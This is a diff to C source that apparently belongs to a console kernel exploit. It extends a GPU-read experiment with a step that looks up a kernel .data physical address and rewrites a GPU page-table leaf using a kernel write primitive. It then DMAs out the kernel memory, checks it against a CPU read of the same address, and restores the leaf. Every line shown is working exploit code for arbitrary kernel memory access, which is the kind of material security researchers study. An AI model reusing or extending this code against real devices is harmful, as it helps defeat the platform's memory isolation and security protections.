@@ -134,9 +134,9 @@ static void hexdump(const char *tag, const uint8_t *b, int n) {
 }
 
 int main(void) {
-  uint64_t bufs[5][2]; /* [0]=cpu va, [1]=off */
-  static const char *names[5] = {"victim", "staging", "cmd", "victim2",
-                                 "victim3"};
+  uint64_t bufs[6][2]; /* [0]=cpu va, [1]=off */
+  static const char *names[6] = {"victim", "staging", "cmd", "victim2",
+                                 "victim3", "victim4"};
   uint64_t text_pa = 0, text2m = 0, off_in = 0;
   uint64_t pe = 0;
 
@@ -161,7 +161,7 @@ int main(void) {
     }
   }
 
-  for (int i = 0; i < 5; i++) {
+  for (int i = 0; i < 6; i++) {
     off_t off = 0;
     void *va = NULL;
     if (sceKernelAllocateDirectMemory(0, 0x400000000ULL, DMEM_SIZE, DMEM_SIZE,
@@ -232,6 +232,39 @@ int main(void) {
              w0 == 0xC0FFEE0000000000ULL ? "RETARGET-OK" : "RETARGET-FAILED");
       kwrite64(vlv, vlval); /* restore */
       notify("gpuread: victim2 leaf restored\n");
+    }
+  }
+
+  /* ---- 1b. DISCRIMINATOR: can the GPU read *system* RAM at all?
+   * Retarget a fresh victim at a kernel .data physical whose bytes we can read
+   * from the CPU, and compare. If this also returns all-ones, then GPU reads of
+   * system RAM are blocked, not just .text. ------------------------------ */
+  {
+    uint64_t kpm = kdlsym(KERNEL_SYM_PMAP_STORE);
+    uint64_t dtarget = KERNEL_ADDRESS_DATA_BASE + 0x1000;
+    uint64_t dpe = 0, dpa = 0, cpu_w0 = 0;
+    if (find_pte(kpm, dtarget, &dpe) != 0xFFFFFFFFFFFFFFFFull) {
+      dpa = PDE_ADDR(dpe) | (dtarget & 0xFFF);
+      kernel_copyout((intptr_t)dtarget, &cpu_w0, 8);
+      notify("gpuread: DATA kva=%#lx pa=%#lx cpu[0]=%#lx\n",
+             (unsigned long)dtarget, (unsigned long)dpa,
+             (unsigned long)cpu_w0);
+      uint64_t vlv = 0, vlval = 0;
+      if (walk("victim4", bufs[5][0], &vlv, &vlval) == 2 && (vlval & 1)) {
+        uint64_t nv = (vlval & ~GPU_LEAF2M_MASK) | (dpa & GPU_LEAF2M_MASK) |
+                      (1ULL << 50);
+        kwrite64(vlv, nv);
+        memset((void *)cmd_va, 0, 0x1000);
+        int rc = dma(cmd_va, bufs[5][0] + (dpa & 0x1FFFFF), cmd_va, 0x1000);
+        uint64_t gw0 = 0;
+        memcpy(&gw0, (void *)cmd_va, 8);
+        notify("gpuread: DATA dma rc=%d gpu[0]=%#lx cpu[0]=%#lx -> %s\n", rc,
+               (unsigned long)gw0, (unsigned long)cpu_w0,
+               gw0 == cpu_w0 ? "SYSRAM-READ-OK" : "SYSRAM-READ-MISMATCH");
+        hexdump("DATA", (const uint8_t *)cmd_va, 16);
+        kwrite64(vlv, vlval);
+        notify("gpuread: victim4 leaf restored\n");
+      }
     }
   }
 
